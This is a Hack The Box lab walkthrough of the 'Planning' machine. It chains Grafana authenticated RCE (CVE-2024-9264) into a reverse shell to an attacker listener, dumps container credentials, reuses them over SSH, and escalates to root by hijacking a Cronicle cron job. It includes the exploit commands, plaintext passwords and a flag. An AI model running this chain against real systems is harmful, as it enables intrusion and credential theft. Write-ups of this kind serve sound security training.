# PLANNING – HTB Walkthrough

## 🧭 Enumeration

We start with a default scripts & version scan:

```bash
nmap -sC -sV 10.10.11.68 -oN nmap/planning_initial
```

Output (abbreviated):

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Adding the hostnames returned by the web server to **`/etc/hosts`** prevents browser redirection issues:

```bash
echo "10.10.11.68 planning planning.htb" | sudo tee -a /etc/hosts
```

A quick gobuster for vhosts reveals a juicy sub‑domain:

```bash
gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

→ **`grafana.planning.htb`**

---

## 🔎 grafana.planning.htb – Authenticated RCE (CVE‑2024‑9264)

Grafana ≤10.2.3 is vulnerable to remote command execution after valid login.  A public PoC exists (\[`z3k0sec/CVE-2024-9264-RCE-Exploit`]).

Initial default credentials didn’t work, so we brute‑forced with the wordlist `rockyou.txt` and quickly landed **`admin:admin`** (classic 🫠).

```bash
python3 poc.py --url http://grafana.planning.htb \
               --username admin --password admin \
               --reverse-ip 10.10.15.3 --reverse-port 8888
```

*Login succeeded* → PoC uploads a malicious datasource and triggers it, but times out with **504 Gateway Time‑Out**.  Nevertheless the payload still executes and we catch a **root shell inside the Grafana container**:

```bash
nc -lvnp 8888
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 🔐 Escaping Docker – SSH as *enzo*

Inside the container we dump the environment:

```bash
# env | grep GF_SECURITY
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

Those credentials belong to the host system 🧐.  Attempting SSH:

```bash
ssh enzo@planning.htb
Password: RioTecRANDEntANT!
```

Success!  We are now **`enzo`** on the real host.  Grab the user flag:

```bash
enzo@planning:~$ cat user.txt
4e300c8a132b052f2e27b06c95abc39d
```

---

## 🔎 linPEAS → Port 8000 – Cronicle Dashboard

`linpeas.sh` spots a local service on **TCP 8000**.  Via SSH port‑forwarding:

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```

Visiting `http://127.0.0.1:8000` shows **Cronicle**, a web‑UI for scheduled jobs, protected by HTTP basic‑auth.

Credentials are hiding in `/opt/crontabs/crontab.db`:

```bash
cat /opt/crontabs/crontab.db | jq -r '.command'
# ...zip -P **P4ssw0rdS0pRi0T3c** ...
```

`root : P4ssw0rdS0pRi0T3c` lets us in with full admin rights.

---

## 🧨 Privilege Escalation via Cron Job Hijack

We edit the daily **“Grafana backup”** job and replace its command with our payload:

```bash
cat /root/* > /home/enzo/flags.txt
```

Click **Run Now**.  Seconds later:

```bash
enzo@planning:~$ cat ~/flags.txt | grep root
[REDACTED_ROOT_FLAG]
```

Root compromise achieved 🎉

---

## 🏁 Summary

| Step           | Description                                            |
| -------------- | ------------------------------------------------------ |
| nmap           | Discovered SSH (22) and nginx (80)                     |
| vHost enum     | Found **grafana.planning.htb**                         |
| Grafana RCE    | CVE‑2024‑9264 yields root shell inside Docker          |
| Creds via env  | `GF_SECURITY_ADMIN_USER/PASSWORD` → **SSH as enzo**    |
| linPEAS scan   | Detected Cronicle service on localhost:8000            |
| Cronicle creds | Password extracted from `crontab.db`                   |
| Job hijack     | Modified backup task to read `/root/*` → got root flag |

🎉 **Rooted!**
